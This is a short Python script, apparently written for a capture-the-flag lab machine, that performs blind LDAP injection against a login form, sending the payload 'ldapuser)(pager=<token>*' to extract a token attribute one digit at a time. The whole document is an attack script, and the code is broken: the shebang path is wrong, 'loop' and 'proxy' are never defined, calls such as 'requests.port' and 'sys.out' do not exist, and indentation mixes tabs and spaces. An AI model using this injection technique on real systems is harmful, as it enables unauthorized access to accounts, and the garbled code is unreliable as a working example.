#!/bin/usr/python3
import requests
import sys
from time import sleep
from string import digits, ascii_lowercase

token = ""
url = "http://10.129.228.34/login"
attribute = "pager" 

while loop > 0:
	for digit in digits:
		token = token
		query = f"ldapuser%29%28{attribute}%3d{token}{digit}%2a" # ldapuser)(pager=<token>*
		data = { 'inputUsername': query, 'inputOTP': "1234"}
		r = requests.port(url, data=data, proxies=proxy)
        sys.out(f'\rToken: {token}{digit}')
        sleep(1)
		if 'Cannot login' in r.text:
			# print(f"Success: {token}{digit}")
            token = token + digit
			break
        elif digit == "9":
            loop = 0
            break
